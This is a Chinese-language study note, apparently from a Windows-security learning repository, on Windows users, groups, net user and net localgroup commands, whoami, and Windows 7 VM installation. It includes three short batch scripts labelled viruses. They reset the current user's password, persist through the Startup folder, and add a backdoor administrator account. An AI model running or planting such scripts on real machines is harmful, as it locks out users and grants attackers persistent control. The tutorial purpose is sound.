# 学习用户与组、win7虚拟机下载配置
## 用户与组
windows 用户
- 给人使用的账户：
1. administrator	管理员账户仅次于 system 的权限
2. guest		来宾（游客） 最新权限
普通用户	在操作系统中新创建的用户

- 计算机服务组件相关账户（机器人）：
1. system	系统账户	至高权限
2. local services	本地服务账户;权限等同普通用户
3. network services  网络服务账户;权限等同普通用户

用户管理界面：

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8768.png)

创建新用户

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8769.png)

**默认**情况下，windows 系统中，**账户的密码最长有效期为 42 天**
【家文件夹】只有在对应账户首次登录之后才会生成。

1. 预定义变量 `%userprofile%`   
`%userprofile%  =  "C:\documents and settings"`   
相当于  `copy 1.bat "C:\documents and settings\「开始」菜单\程序\启动"` 
= `copy 1.bat "%userprofile%\「开始」菜单\程序\启动"`

> 可通过`echo`去查看`%userprofile%`，`echo %userprofile%`，会显示在`C:\documents and settings`

表示 当前操作系统用户的 配置文件夹（家目录）,通过该变量可以保证将文件写入不同用户的启动\桌面等个人文件夹中
  `copy 1.bat "%userprofile%\「开始」菜单\程序\启动"`
  `echo 123456 >> "%userprofile%\桌面\666666.txt"`

`%username%` 表示当前操作系统用户的账户名称

2. 账户命令
- `net user`  查看当前系统的用户列表
- `net user /add`  通过命令添加新用户
- `net user yanxinyuan 123.com /add`    新建一个账户名为yanxinyuan，密码为123.com
- `net user /del`  删除一个已有用户
- `net user shenyoujia /del`   将账户shenyoujia删除
- `net user  wangdandan 123`   将账户wangdandan的密码改为123

3.  `net user` 用户名   查看当前账户的详细信息
- `net user administrator`  查看administrator账户的详细信息

4. `whoami` 查看当前账户的计算机名和用户名
- 执行`whoami`之后，可以看下图效果
- 可以通过右键我的电脑→属性→计算机名→完整的计算机名查看

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8770.png)

- `Whoami /user`  显示计算机名、用户名以及SID，这个命令的作用在于，**做渗透测试时，可以用本命令看一下自己的账号级别能干什么，甚至有可能做测试的时候会拿到system权限账号（最高权限，比管理员权限高）**。SID中，最后一段表示账户的序号。新建的用户需要默认从1000开始，依次累加，administrator账户的序号是500。

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8771.png)

### 【创建用户小程序】
```
@echo off
echo===============================================
echo                  系统用户创建工具
echo===============================================
set /p u=请输入用户名
set /p p=请输入登录密码
net user %u% %p% /add
echo 恭喜您账户创建成功
echo 您的用户名为：%u%
echo 您的密码为：%p%
echo 注销当前账户后，在操作系统登录界面可使用新账户
pause
```

### 【修改密码病毒】
把当前账户的密码改为123
```
@echo off
net user %username% 123  
```
管理员账户一般都支持远程登陆，如果这个漏洞修改的是管理员的密码就非常的危险

5. 组是用来盛放用户的容器，用户处于不同的组当中就会拥有不同的权限
- administrators        管理员组
- guests                来宾组
- users                 普通用户组 （在家文件夹可以读写，其余地方没有添加删除权限）
- network               网络配置组 
- print                  打印机组 
- Rmote desktop       远程桌面组
                  
A、在组中添加用户

在组管理中右击某个具体的组名称

![iamge](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8772.png)

之后点击，添加，在界面中填写某个用户名，而且将该用户置于当前组中

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8773.png)

B、将用户从组中移除

 在组管理中找到一个组，右击组名称，选择“属性”，之后在列表中选中一个用户名，最后点击“删除”

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8774.png)

> 一个用户可以在多个组内，所以每个组都可以赋予用户不同的权力，也就是这个组可以给你xx权力，而不是禁止用户做什么。

6. 组管理命令
- `net localgroup`   查看组列表
- `net localgroup` 组名    查看组中的成员
- `net localgroup users`  查看users组中存在哪些账户
- `net localgroup` 组名 用户名 /add
- `net localgroup administrators cuizhiqiang /add` 把账户cuizhiqiang提升为超级管理员
- `net localgroup` 组名 用户名 /del
- `net localgroup administrators cuizhiqiang /del` 把账户cuizhiqiang从管理员组移除 

### 【密码修改病毒-顽固版】
```
@echo off
copy 1.bat "%userprofile%\「开始」菜单\程序\启动"
net user %username% 123
```

> 每次受害者找回密码后，只能使用一次新密码，当第二次登录时又会被篡改

### 【获取新管理员账号病毒】
```
@echo off
copy 1.bat "%userprofile%\「开始」菜单\程序\启动"
net user wangdandan1058 123 /add
net localgroup administrators wangdandan1058 /add
 ```
 
## window7 虚拟机安装

安装时选择“自定义”（安装新的windows系统）

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8775.png)

在划分磁盘时，选中计算机的硬盘，之后点击“驱动器选项”

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8776.png)

接着点击“新建”

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8777.png)

当一个分区划分完毕后，选中“未分配空间”之后点击“新建”，来划分其它的分区

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8778.png)

安装时需要填写用户名

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8779.png)

设置完用户名之后，填写登录密码

![image](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8780.png)

输入密钥的界面，取系勾选“自动激活”，之后点击“跳过”

![iamge](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8780.png)

![iamge](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8782.png)

网络类型选择

![iamge](https://github.com/AlphaXiao/CTF-Windows-Security/blob/main/Days/pictures/%E5%9B%BE%E7%89%8783.png)
